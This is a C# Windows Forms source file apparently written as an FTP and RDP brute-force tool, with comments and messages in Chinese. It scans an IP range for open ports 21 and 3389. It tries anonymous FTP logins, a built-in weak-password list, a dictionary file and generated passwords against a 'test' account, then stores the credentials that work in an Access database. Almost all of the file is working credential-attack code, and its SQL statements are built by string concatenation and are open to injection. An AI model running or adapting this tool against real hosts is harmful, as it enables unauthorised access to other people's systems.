using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Text.RegularExpressions;
using System.Net.Sockets;
using System.Threading;
using System.Data.OleDb;
using System.IO;


namespace ftpSwitch
{
    public partial class Form1 : Form
    {
        string ftpServerIP;
        string ftpObjIp;
        string[] ftpPassword = { "", "asd123", "111", "1", "aaa", "123456", " " };
        static Dictionary<char, int> pswDic = new Dictionary<char, int>{
            { '0', 0 }, {'1',1 }, {'2',2 }, {'3',3 }, {'4',4},{'5', 5 }, {'6',6 }, {'7',7 },{'8', 8 },{'9', 9 },{'a', 10 }, {'b',11 }, {'c',12 }
        };
        static Dictionary<int, char> strPswDic = new Dictionary<int, char>{
            { 0, '0' }, {1,'1' }, {2,'2' }, {3,'3' }, {4,'4'},{5, '5' }, {6,'6' }, {7,'7' },{8, '8' },{9, '9' },{10, 'a' }, {11,'b' }, {12,'c' }
        };
        string FS;
        bool trystate = true;
        bool is_con = true;
        public List<string[]> InfoList = new List<string[]>();
        bool is_success = false;
        List<string> PswList;
        public delegate List<string> MethodCaller(string path);


        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            MethodCaller mc = new MethodCaller(Read);
            IAsyncResult result = mc.BeginInvoke(@"C:\Users\lflx1\source\repos\ftpSwitch\dbs\psw.txt", null, null);
            PswList = mc.EndInvoke(result);
            ShowMsg("密码字典读取完成,最终行为：" + makePsw(PswList[PswList.Count - 1]));
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (textBox1.Text.Contains("IP"))
            {
                textBox1.Text = "";
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            ftpServerIP = textBox1.Text;
            ftpObjIp = textBox2.Text;
            is_success = false;
            bool EF = true;
            if (ValidateIPAddress(ftpServerIP) && ValidateIPAddress(ftpObjIp))
            {
                int check = 0;
                long che = 0;
                int checkObj = 0;
                bool isBySql = false;
                string sta = boom(ftpServerIP.Split('.'));

                string obj = boom(ftpObjIp.Split('.'));

                check = int.Parse(sta.Substring(sta.Length - 3, 3));
                checkObj = int.Parse(obj.Substring(obj.Length - 3, 3));
                che = System.Math.Abs(long.Parse(sta) - long.Parse(obj));
                string ip = ftpServerIP;
                int max = int.Parse(textBox3.Text);
                if (Dictionary.Checked)
                {
                    if (string.Equals(ValidateIPAddress(ftpServerIP), ValidateIPAddress(ftpObjIp)))
                    {
                        int listCount = PswList.Count;
                        int maxcount = 1;
                        foreach (string s in PswList)
                        {
                            FtpBySocket(ip, "test", s);
                            if (is_success) break;
                            if (maxcount > max - 1) break;
                            maxcount++;
                        }
                        string psw = makePsw(PswList[PswList.Count - 1]);
                        while (!is_success && max - listCount > 0)
                        {
                            FtpBySocket(ip, "test", psw);
                            psw = makePsw(psw);
                            Write(psw);
                            max--;

                        }

                        if (is_success)
                        {
                            string[] submit = { "test", psw };
                            InfoList.Add(submit);
                        }

                    }
                    else
                    {
                        MessageBox.Show("暴力破解就对单一目标吧");
                    }
                }
                else
                {

                    if (che >= 255)
                    {
                        MessageBox.Show("这都跨网段了，目标小一点吧");
                        return;
                    }
                    while (System.Math.Abs(check - checkObj) >= 0 && EF)
                    {
                        string[] iplist = { ip, "" };
                        ShowMsg(SelectPassword(ip));
                        string que = SelectPassword(ip);
                        if (que != "")
                        {
                            FtpBySocket(ip, "test", que);
                            isBySql = true;
                        }
                        if (!is_success)
                        {
                            ShowMsg("尝试匿名登陆");
                            if (is_con)
                            {
                                FtpBySocket(ip, "", "");
                                if (is_success && !isBySql)
                                {
                                    InfoList.Add(iplist);
                                    is_success = false;
                                }
                            }
                            if (!trystate)
                            {
                                if (is_con)
                                {
                                    foreach (string psw in ftpPassword)
                                    {

                                        FtpBySocket(ip, "test", psw);
                                        iplist[1] = psw;
                                        if (is_success)
                                        {
                                            InfoList.Add(iplist);
                                            is_success = false;
                                        }
                                        if (trystate) break;
                                        if (!is_con) break;
                                    }
                                }
                            }
                        }
                        che--;
                        if (string.Equals(ip, ftpObjIp))
                        {
                            EF = false;
                        }
                        else
                        {
                            ip = strsub(ip);
                            is_con = true;
                        }
                    }
                }
                if (InfoList != null && InfoList.Count > 0)
                {
                    Insert(InfoList);
                }

            }

            else
            {
                MessageBox.Show("IP输入格式不对哟，看看是不是输错了");
            }

            /*
             * 本部分为直接使用FtpWebRequest的版本，如有需要将上面代码注释留下本部分即可
             * 
            if (ValidateIPAddress(ftpServerIP))
            {
                int i = 0;
                StateShow.Text += "\r\n开始尝试匿名连接";
                if (TryFtp(ftpServerIP, "", ""))
                {
                    StateShow.Text += "\r\n 匿名登陆成功";
                    
                }
                else
                {
                    StateShow.Text += "\r\n 匿名登陆已关闭，尝试简单密码登陆";
                }
                while (!TryFtp(ftpServerIP, "test", ftpPassword[i])&&i<7)
                {
                    StateShow.Text += "\r\n 本次尝试-->用户名：test  ，密码：" + ftpPassword[i];
                    if(i<6)
                    i++;
                }
                if (i >= 7)
                    StateShow.Text += "\r\n 简单密码尝试完毕，未找到匹配密码 " + i;
                else
                    StateShow.Text += "\r\n 扫描成功，用户名：test  密码：" + ftpPassword[i] + " \r\n";

            }
            else
            {
                MessageBox.Show("IP输入格式不对哟，看看是不是输错了");
            }
            */


        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox1.Text = "";
            Easy.Checked = true;
            StateShow.Text = "";

        }

        private void flowLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void label2_Click_1(object sender, EventArgs e)
        {

        }



        private void label2_Click_2(object sender, EventArgs e)
        {

        }

        private void radioButton2_CheckedChanged(object sender, EventArgs e)
        {

        }

        public static bool ValidateIPAddress(string ipAddress)
        {
            Regex validipregex = new Regex(@"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$");
            return (ipAddress != "" && validipregex.IsMatch(ipAddress.Trim())) ? true : false;
        }

        public bool TryFtp(string Ip, string User, string password)
        {
            bool state = true;
            FtpWebRequest reqFtp;
            reqFtp = (FtpWebRequest)FtpWebRequest.Create(new Uri("ftp://" + ftpServerIP + "/"));
            try
            {

                //测试ftp是否成功
                reqFtp.Credentials = new NetworkCredential(User, password);
                reqFtp.Method = WebRequestMethods.Ftp.ListDirectory;
                reqFtp.KeepAlive = false;
                reqFtp.Timeout = 1000;
                FtpWebResponse response = (FtpWebResponse)reqFtp.GetResponse();
                response.Close();
            }
            catch (Exception ex)
            {
                state = false;
                StateShow.Text += "\r\n 发生错误 --> " + ex.Message;
            }


            return state;
        }
        Socket socket;
        public int FtpBySocket(string Ip, string User, string Password, string Port = "21")
        {

            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPAddress ip = IPAddress.Parse(Ip);
                IPEndPoint point = new IPEndPoint(ip, Convert.ToInt32("21"));
                socket.Connect(point);
                ShowMsg("端口开启");
                Received();

                socket.Send(Encoding.Default.GetBytes(string.Format("{0}{1}", "USER " + User, Environment.NewLine)));
                Received();
                socket.Send(Encoding.Default.GetBytes(string.Format("{0}{1}", "PASS " + Password, Environment.NewLine)));
                Received();
            }
            catch (Exception ex)
            {
                trystate = false;
                is_con = false;
                ShowMsg("\r\n 连接发生错误 --> " + ex.Message);
            }


            return 0;
        }

        void ShowMsg(string str)
        {
            StateShow.AppendText(str + "\r\n");
        }
        void Received()
        {


            byte[] buffer = new byte[1024 * 1024 * 3];
            //实际接收到的有效字节数
            int len = socket.Receive(buffer);

            string str = Encoding.UTF8.GetString(buffer, 0, len);
            ShowMsg(socket.RemoteEndPoint + ":" + str);


            if (str.Contains("530") || str.Contains("501") || str.Contains("331") || str.Contains("503"))
            {
                trystate = false;

            }
            else
            {
                trystate = true;
            }
            if (str.Contains("230"))
            {
                is_success = true;
            }


        }

        void ChangeFS(string str)
        {
            FS = str;
        }


        private static string conStr = @"Provider=microsoft.ace.oledb.12.0;Data Source=C:\Users\lflx1\source\repos\ftpSwitch\dbs\ftpfinder.mdb";

        private OleDbConnection DB()
        {
            try
            {
                OleDbConnection dbconn = new OleDbConnection(conStr);

                return dbconn;
            }
            catch (Exception ex)
            {
                ShowMsg("\r\n 数据库连接发生错误 --> " + ex.Message);
                return null;
            }

        }

        void Insert(List<string[]> list)
        {

            OleDbConnection db = DB();
            string sql = "";
            foreach (string[] l in list)
            {
                sql = "INSERT INTO finder VALUES ( '" + l[0] + "','" + l[1] + "'  ) ";
                ShowMsg(sql);
                ShowMsg("记录连接->IP:" + l[0] + "密码：" + l[1]);
            }

            db.Open();

            OleDbCommand cmd = new OleDbCommand(sql, db);
            int a = cmd.ExecuteNonQuery();
            db.Close();
            if (a > 0)
            {
                ShowMsg("记录成功");
            }

        }
        string SelectPassword(string ip)
        {
            OleDbConnection db = DB();
            db.Open();
            string rec = "";
            string sql = "SELECT PASSWORD FROM finder WHERE IP ='" + ip + "'";
            OleDbCommand cmd = new OleDbCommand(sql, db);
            if (cmd.ExecuteScalar() != null)
                rec = cmd.ExecuteScalar().ToString();
            db.Close();

            return rec;
        }



        void FileRite()
        {

        }

        private void StateShow_TextChanged(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        public string boom(string[] strings)
        {
            string str = "";
            foreach (string s in strings)
            {
                switch (s.Length)
                {
                    case 1:
                        str += "00" + s;
                        break;
                    case 2:
                        str += "0" + s;
                        break;
                    case 3:
                        str += s;
                        break;
                }
            }
            return str;
        }
        public string strsub(string str)
        {
            string st = "";
            string[] s = str.Split('.');

            for (int i = 0; i < 4; i++)
            {
                if (i == 3)
                {
                    st += (int.Parse(s[i]) + 1).ToString();
                }
                else
                {
                    st += s[i] + ".";
                }
            }
            return st;
        }

        private void textBox2_TextChanged_1(object sender, EventArgs e)
        {
            if (textBox2.Text.Contains("IP"))
            {
                textBox2.Text = "";
            }
        }

        public List<string> Read(string path)
        {
            StreamReader sr = new StreamReader(path, Encoding.Default);
            string line;
            List<string> list = new List<string>();
            while ((line = sr.ReadLine()) != null)
            {
                list.Add(line.ToString());
            }
            sr.Close();
            return list;
        }
        public void Write(string path)
        {
            string loc = @"C:\Users\lflx1\source\repos\ftpSwitch\dbs\psw.txt";
            StreamWriter sw = new StreamWriter(loc, true);
            sw.WriteLine(path);
            sw.Close();
        }

        public string makePsw(string last)
        {
            string rec = "";
            int[] flag = { -1, -1, -1, -1 };
            int j = 0;
            for (int m = 4 - (last.Length); m < 4; m++)
            {

                flag[m] = pswDic[last[j]];
                j++;
            }

            for (int i = 3; i >= 0; i--)
            {
                if (i == 3)
                    flag[i]++;

                if (flag[i] >= 13)
                {
                    flag[i] = 0;
                    flag[i - 1]++;
                }
            }

            foreach (int k in flag)
            {
                if (k >= 0)
                {
                    rec += strPswDic[k];
                }
            }
            return rec;
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
        }

        private void label4_Click(object sender, EventArgs e)
        {

        }
        bool is_rdp_success = false;
        private void button1_Click_1(object sender, EventArgs e)
        {
            is_rdp_success = false;

            string ip = textBox4.Text;
            string itmip = textBox5.Text;

            string user = userBox.Text;
            string password = pswBox.Text;
            //扫描
            if (radioButton3.Checked)
            {
                string sta = boom(ip.Split('.'));
                string obj = boom(itmip.Split('.'));
                int check = int.Parse(sta.Substring(sta.Length - 3, 3));
                int checkObj = int.Parse(obj.Substring(obj.Length - 3, 3));
                long che = System.Math.Abs(long.Parse(sta) - long.Parse(obj));
                if (che >= 255)
                {
                    MessageBox.Show("这都跨网段了，目标小一点吧");
                    return;
                }
                bool EF = true;
                while (System.Math.Abs(check - checkObj) >= 0 && EF)
                {
                    try
                    {
                        socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        IPAddress socketIp = IPAddress.Parse(ip);
                        IPEndPoint point = new IPEndPoint(socketIp, Convert.ToInt32(3389));
                        socket.Connect(point);
                        ShowMsg("端口开启");
                        socket.Close();

                    }
                    catch (Exception ex)
                    {
                        MstscShow("\r\n 连接发生错误 --> " + ex.Message);
                    }
                    if (string.Equals(ip, itmip))
                    {
                        EF = false;
                    }
                    else
                    {
                        ip = strsub(ip);
                        is_con = true;
                    }
                }
            }
            else
            {
                //登陆
                try
                {
                    socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    IPAddress socketIp = IPAddress.Parse(ip);
                    IPEndPoint point = new IPEndPoint(socketIp, Convert.ToInt32(3389));
                    socket.Connect(point);
                    ShowMsg("端口开启");
                    socket.Close();



                    if (radioButton1.Checked)
                    {
                        ConMstsc(ip, "3389", user, password, false);
                    }
                    else
                    {

                        int max = 10;
                        int listCount = PswList.Count;
                        string que = "";
                        que = SelectSmtsc(ip);
                        if (que != "")
                        {
                            ConMstsc(ip, "3389", "test", que, true);
                        }
                        if (!is_rdp_success)
                        {
                            foreach (string s in PswList)
                            {
                                ConMstsc(ip, "3389", "test", s, true);
                                DateTime dt1 = DateTime.Now;
                                while ((DateTime.Now - dt1).TotalMilliseconds < 3000) Application.DoEvents();
                                if (is_rdp_success) break;
                                rdp.Disconnect();
                                while ((DateTime.Now - dt1).TotalMilliseconds < 4000) Application.DoEvents();
                                MstscShow("系统正被占用或登陆时用户名密码错误或超时,密码:" + s);

                            }
                        }
                        string psw = makePsw(PswList[PswList.Count - 1]);

                        while (!is_rdp_success && max - listCount > 0)
                        {
                            Write(psw);
                            ConMstsc(ip, "3389", "test", psw, true);
                            DateTime dt1 = DateTime.Now;
                            while ((DateTime.Now - dt1).TotalMilliseconds < 3000) Application.DoEvents();
                            if (!is_rdp_success)
                            {
                                rdp.Disconnect();
                                while ((DateTime.Now - dt1).TotalMilliseconds < 4000) Application.DoEvents();
                                MstscShow("系统正被占用或登陆时用户名密码错误或超时:循环");

                            }
                            else
                            {
                                break;
                            }
                            psw = makePsw(psw);
                            max--;

                        }
                        if (is_rdp_success)
                        {
                            string[] submit = { "test", psw };
                            IncSmtsc(submit);
                        }


                    }
                }
                catch (Exception ex)
                {
                    MstscShow("发生错误->" + ex.Message);
                }
            }
        }

        void MstscShow(string str)
        {
            MstscState.Items.Add(str);
            MstscState.TopIndex = MstscState.Items.Count - 1;
        }
        void ConMstsc(string ip, string port, string user, string password, bool model)
        {

            try
            {

                rdp.Server = ip;
                rdp.AdvancedSettings2.RDPPort = int.Parse(port);
                rdp.UserName = user;
                rdp.AdvancedSettings2.ClearTextPassword = password;
                if (model)
                    rdp.OnLoginComplete += Rdp_OnLoginComplete;
                rdp.Connect();
            }
            catch (Exception ex)
            {
                MstscShow("发生错误->" + ex.Message);
            }
        }

        private void Rdp_OnLoginComplete(object sender, EventArgs e)
        {
            is_rdp_success = true;
            MstscShow("连接成功,请根据桌面提示进行操作");
        }

        private void rdp_OnConnecting(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Maximized;
        }
        private void IncSmtsc(string[] var)
        {
            try
            {
                OleDbConnection db = DB();
                string sql = "";
                sql = "INSERT INTO mstsc VALUES ( '" + var[0] + "','" + var[1] + "'  ) ";
                ShowMsg(sql);
                ShowMsg("记录连接->IP:" + var[0] + "密码：" + var[1]);


                db.Open();

                OleDbCommand cmd = new OleDbCommand(sql, db);
                int a = cmd.ExecuteNonQuery();
                db.Close();
                if (a > 0)
                {
                    MstscShow("记录成功");
                }
            }
            catch (Exception ex)
            {
                MstscShow("发生错误->" + ex.Message);
            }
        }

        private string SelectSmtsc(string ip)
        {
            OleDbConnection db = DB();
            db.Open();
            string rec = "";
            string sql = "SELECT PASSWORD FROM mstsc WHERE IP ='" + ip + "'";
            OleDbCommand cmd = new OleDbCommand(sql, db);
            if (cmd.ExecuteScalar() != null)
                rec = cmd.ExecuteScalar().ToString();
            db.Close();

            return rec;
        }

        private void serachPort(string ip)
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPAddress socketIp = IPAddress.Parse(ip);
                IPEndPoint point = new IPEndPoint(socketIp, Convert.ToInt32(3389));
                socket.Connect(point);
                ShowMsg("端口开启");
                socket.Close();
            }
            catch (Exception ex)
            {
                MstscShow("发生错误->" + ex.Message);
            }
        }
    }

}
